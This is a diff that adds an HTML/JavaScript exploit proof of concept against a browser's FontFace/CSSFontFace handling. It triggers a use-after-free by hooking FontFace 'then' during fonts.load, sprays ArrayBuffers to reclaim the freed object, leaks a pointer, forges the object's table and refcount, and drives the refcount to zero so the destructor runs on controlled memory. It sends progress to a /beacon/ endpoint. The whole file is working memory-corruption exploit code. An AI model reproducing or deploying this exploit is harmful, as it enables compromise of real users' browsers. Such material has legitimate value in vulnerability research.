@@ -1,0 +1,254 @@
+<!--
+  p656c: forge + deref-to-zero — observe ~CSSFontFace run on our buffer
+
+  Builds on p656b (FORGE CONFIRMED on bench):
+    - Phase 1 UAF -> T1 leak (fonts.load + delete(this) pattern)
+    - Phase 2 forge +0x58=T1 -> addClient uses forged table, rc = seed+1
+
+  Observed topology: stable state is seed+1 (exactly ONE engine ref held).
+  NEW Phase 3:
+    - Phase 2 spray seed rc = 0  -> after addClient rc = 1
+    - snapshot buffer (48 dwords)
+    - document.fonts.clear()    -> the pending deref -> rc 0 -> destructor
+    - respray 192B markers each poll; if slot freed, dv2 marker swaps
+    - poll 20 x 100ms: rc, diffs, DESTRUCTOR / FREED / STABLE verdict
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656c</title></head>
+<body>p656c: deref-zero destructor
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656C-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'deref-zero');
+flush();
+
+var phase = 0;
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var sty2 = null;
+
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      sty1.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);
+        dv.setUint32(0x04, 0xAAAA0001, true);
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=' + bufs1.length);
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 0, true);        // SEED RC = 0  -> +1 = 1 after addClient
+        dv.setUint32(0x04, 0xCCCC0003, true);
+        dv.setUint32(0x58, T1_lo, true);    // FORGE m_table = T1
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=' + bufs2.length + ' seed=0 forge=T1');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+setTimeout(function() {
+try {
+  var hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+  }
+  if (hit1 < 0) {
+    for (var i = 0; i < bufs1.length; i++) {
+      if (bufs1[i].dv.getUint32(0x58, true) !== 0 || bufs1[i].dv.getUint32(0x5C, true) !== 0) {
+        hit1 = i; break;
+      }
+    }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'no reclaim'); flush(); return; }
+
+  var dv1 = bufs1[hit1].dv;
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+
+  emit('P1-HIT', 'hit=' + hit1);
+  emit('P1-TW', 'T1=' + hex32(T1_hi) + hex32(T1_lo) + ' W1=' + hex32(dv1.getUint32(0x6C, true)) + hex32(dv1.getUint32(0x68, true)));
+  flush();
+
+  if (T1_lo === 0 && T1_hi === 0) { emit('P1-FAIL', 'T1 null'); flush(); return; }
+
+  // --- Phase 2 setup ---
+  sty2 = document.createElement('style');
+  sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+  document.head.appendChild(sty2);
+
+  var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+  document.fonts.add(ffB);
+  void ffB.loaded;
+
+  phase = 2;
+  document.fonts.load('1em fb, sb', 'CD');
+
+  setTimeout(function() {
+  try {
+    var hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var i = 0; i < bufs2.length; i++) {
+        if (bufs2[i].dv.getUint32(0x68, true) !== 0 || bufs2[i].dv.getUint32(0x6C, true) !== 0) {
+          hit2 = i; break;
+        }
+      }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'no reclaim'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0x00, true);
+    var f58_lo = dv2.getUint32(0x58, true);
+    var f58_hi = dv2.getUint32(0x5C, true);
+    var forgeHeld = (f58_lo === T1_lo && f58_hi === T1_hi);
+
+    emit('P2-HIT', 'hit=' + hit2 + ' rc=' + rc2 + ' forge=' + forgeHeld);
+    flush();
+
+    if (!forgeHeld) {
+      emit('FORGE-FAIL', 'final=' + hex32(f58_hi) + hex32(f58_lo));
+      flush(); return;
+    }
+
+    // --- Phase 3: deref to zero ---
+    // stable state should be rc = seed(0) + 1 = 1
+    var snap = [];
+    for (var j = 0; j < 192; j += 4) snap.push(dv2.getUint32(j, true));
+
+    emit('PRE-CLEAR', 'rc=' + rc2 + ' (expect 1)');
+
+    var fresh = [];
+    try {
+      document.fonts.clear();
+      emit('CLEAR', 'ok');
+    } catch(e) { emit('CLEAR', 'ERR:' + String(e).slice(0,60)); }
+    flush();
+
+    var pollN = 0;
+    var maxPolls = 20;
+    var verdictSent = false;
+
+    function poll() {
+      pollN++;
+      // churn: allocate fresh 192B markers — if our slot got freed,
+      // one may land on it and the dv2 view shows the FRESH marker
+      for (var k = 0; k < 8; k++) {
+        var ab = new ArrayBuffer(192);
+        var dvf = new DataView(ab);
+        dvf.setUint32(0x04, 0xF7EE0657, true);
+        fresh.push(dvf);
+      }
+
+      var curRc = dv2.getUint32(0x00, true);
+      var curMk = dv2.getUint32(0x04, true);
+
+      var changed = [];
+      for (var j = 0; j < 192; j += 4) {
+        var cur = dv2.getUint32(j, true);
+        if (cur !== snap[j / 4]) {
+          changed.push('+' + j.toString(16) + ':' + hex32(snap[j/4]) + '>' + hex32(cur));
+          snap[j / 4] = cur;
+        }
+      }
+
+      if (pollN <= 3 || changed.length || curMk === 0xF7EE0657) {
+        emit('POLL', 'n=' + pollN + ' rc=' + curRc + ' mk=0x' + hex32(curMk));
+        if (changed.length) emit('CHANGED', changed.slice(0, 12).join(' '));
+        flush();
+      }
+
+      if (curMk === 0xF7EE0657 && !verdictSent) {
+        verdictSent = true;
+        emit('FREED', 'slot returned to allocator and re-taken by fresh spray');
+        flush();
+        return; // stop polling — view is aliased to another JS buffer
+      }
+
+      if (changed.length && !verdictSent) {
+        // destructor wrote into the buffer before any free
+        emit('DESTRUCTOR', 'engine wrote rc=' + curRc + ' diffs=' + changed.length);
+        var full = [];
+        for (var j = 0; j < 192; j += 8) {
+          full.push('+' + j.toString(16) + '=' + hex32(dv2.getUint32(j+4, true)) + hex32(dv2.getUint32(j, true)));
+        }
+        emit('FULL', full.join(' '));
+        verdictSent = true;
+        flush();
+        // keep polling a bit to see if it frees afterwards
+      }
+
+      if (pollN < maxPolls) {
+        setTimeout(poll, 100);
+      } else {
+        emit('END', 'rc=' + dv2.getUint32(0, true) + ' mk=0x' + hex32(dv2.getUint32(4, true)) +
+          ' verdict=' + (verdictSent ? 'seen' : 'STABLE-no-change'));
+        emit('ALIVE', 'end');
+        flush();
+      }
+    }
+
+    setTimeout(poll, 60);
+
+  } catch(e2) { emit('P2-FATAL', String(e).slice(0,200)); flush(); }
+  }, 150);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,200)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
